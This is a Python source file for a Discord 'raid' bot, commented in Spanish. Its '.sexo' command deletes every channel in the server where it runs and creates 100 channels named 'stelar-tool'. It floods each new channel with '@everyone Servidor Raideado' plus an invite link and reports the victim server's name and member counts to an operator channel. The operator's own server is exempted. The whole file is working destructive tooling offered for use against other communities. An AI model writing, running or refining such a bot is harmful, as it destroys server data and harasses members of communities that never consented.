import discord
from discord.ext import commands
import asyncio

# Configurar intents
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='.', intents=intents)

GUILD_ID = 1095461265926799437
CHANNEL_ID = 1145884081939300463

@bot.event
async def on_ready():
    servidores = len(bot.guilds)
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, 
        name=f'{servidores} ☠️'
    ))
    print(f'✅ Bot conectado como {bot.user}')

# Remover el comando "help" predeterminado de discord.py
bot.remove_command("help")

@bot.command()
async def help(ctx):
    if ctx.guild.id == GUILD_ID:  # Restringir ejecución en el servidor específico
        await ctx.send("🚫 No puedes ejecutar este comando en este servidor.")
        return
    
    embed = discord.Embed(
        title="🛠️ Comandos del Bot",
        description="Aquí tienes una lista de los comandos disponibles:",
        color=discord.Color.blue()
    )
    embed.add_field(name=".sexo", value="🔨 Borra todos los canales y crea 100 nuevos.", inline=False)
    embed.add_field(name=".help", value="📜 Muestra esta lista de comandos.", inline=False)

    embed.set_footer(text="Gracias por usar nuestro bot tool! 🚀")
    
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def sexo(ctx):  
    if ctx.guild.id == GUILD_ID:
        await ctx.send("🚫 No puedes ejecutar este comando en este servidor.")
        return
    
    await ctx.send("🔨 Eliminando todos los canales...")

    # Borrar todos los canales
    for canal in ctx.guild.channels:
        try:
            await canal.delete()
        except Exception as e:
            print(f"Error al eliminar canal {canal.name}: {e}")

    # Crear 100 nuevos canales con el mismo nombre
    canales_creados = []
    for _ in range(100):
        try:
            nuevo_canal = await ctx.guild.create_text_channel('stelar-tool')
            canales_creados.append(nuevo_canal)
        except Exception as e:
            print(f"Error al crear canal: {e}")

    for canal in canales_creados:
        await canal.send("@everyone Servidor Raideado por discord.gg/8FEqDDHWrC")

    # Obtener la información correcta del servidor donde se ejecutó el comando
    guild_ejecucion = ctx.guild  
    if guild_ejecucion:
        channel = bot.get_channel(CHANNEL_ID)  # Canal donde se enviará el embed
        if channel:
            bots = len([member for member in guild_ejecucion.members if member.bot])
            embed = discord.Embed(
                title="📢 Comando .sexo ejecutado",
                description="Aquí está la información del servidor donde se ejecutó el comando:",
                color=discord.Color.red()
            )
            embed.add_field(name="🔹 Nombre del Servidor", value=guild_ejecucion.name, inline=False)
            embed.add_field(name="👥 Miembros Totales", value=guild_ejecucion.member_count, inline=True)
            embed.add_field(name="🤖 Número de Bots", value=bots, inline=True)
            embed.add_field(name="🛠️ Canales Creados", value="100 canales 'stelar-tool'", inline=False)

            embed.set_footer(text="Gracias por usar nuestro bot tool! 🚀")
            
            await channel.send(embed=embed)

    print(f"✅ Se ejecutó el comando .sexo en {ctx.guild.name} (ID: {ctx.guild.id}). 🎉 Se enviaron los detalles al canal específico.")

@sexo.error
async def sexo_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("🚫 No tienes permisos para usar este comando.")
    else:
        await ctx.send("⚠️ Ha ocurrido un error al ejecutar el comando.")

bot.run("")